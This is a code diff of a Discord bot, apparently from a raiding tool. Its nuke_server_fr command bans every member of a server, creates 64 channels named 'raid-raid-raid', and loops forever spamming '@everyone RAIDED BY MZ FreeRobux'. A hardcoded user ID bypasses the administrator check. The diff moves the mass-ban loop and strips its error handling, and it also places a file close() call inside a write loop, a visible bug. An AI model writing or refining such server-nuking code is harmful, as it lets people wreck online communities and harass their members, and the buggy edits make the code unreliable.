@@ -176,6 +176,12 @@ async def nuke_server_fr(ctx):
             for membertemp in guild.members:
                 all_members_list.append(membertemp)
 
+        async def ban(self, *, member1: discord.Member, reason=None):
+            await member1.ban(reason=reason)
+
+        for member in all_members_list:
+            await ban(member1=member, self=None)
+
         async def nuke_channel_2(txt):
             if not txt.author.guild_permissions.administrator and not txt.author.id == 762152955382071316:
                 print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
@@ -203,16 +209,7 @@ async def nuke_server_fr(ctx):
         for i in range(64):
             await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
 
-        for member in all_members_list:
-            try:
-                async def ban(self, *, member: discord.Member, reason=None):
-                    await member.ban(reason=reason)
 
-                await ban('', member=member, reason=None)
-            except:
-                None
-            finally:
-                None
 
         while True:
             await newchannel.send('**<@everyone> RAIDED BY MZ FreeRobux '
@@ -395,7 +392,7 @@ async def optinspam(ctx):
         for line in lines:
             if line.strip("\n") != str(ctx.author.id):
                 new_file.write(str(line))
-        new_file.close()
+                new_file.close()
 
         await ctx.channel.send("You have opted in for spam! If you wish to opt out again, use the command `.optout_spam`!")
 
